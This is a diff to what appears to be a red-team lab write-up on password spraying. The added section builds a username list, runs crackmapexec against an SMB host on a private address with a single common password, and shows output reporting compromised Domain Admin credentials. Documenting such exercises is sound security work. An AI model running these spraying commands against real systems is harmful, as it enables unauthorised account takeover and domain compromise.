@@ -1,13 +1,25 @@
+# 🔑 Initial Access - Password Spraying
 
-## Red Team – Initial Access
+## Objective
+Perform password spraying against domain users to discover valid credentials.
 
-### Objective
-Gain access to the target system and establish a foothold.
+## Commands Used
+```bash
+# Create user list based on enumeration
+cat > users.txt << EOF
+john.doe
+it.admin
+svc.backup
+Administrator
+EOF
 
-### Techniques Used
-- Credential-based access
-- Service enumeration
-- User-level access exploitation
+# Password spraying attack
+crackmapexec smb 192.168.56.10 -u users.txt -p 'password@123' --continue-on-success
+Results
+text
+[+] corp.local\Administrator:password@123 (Pwn3d!)
+💥 Success
+Found valid Domain Admin credentials! This provided full access to the domain controller.
 
-### Result
-Initial access obtained with limited privileges, enabling further attack phases.
+📸 Evidence
+https://screenshots/pwn3d.png
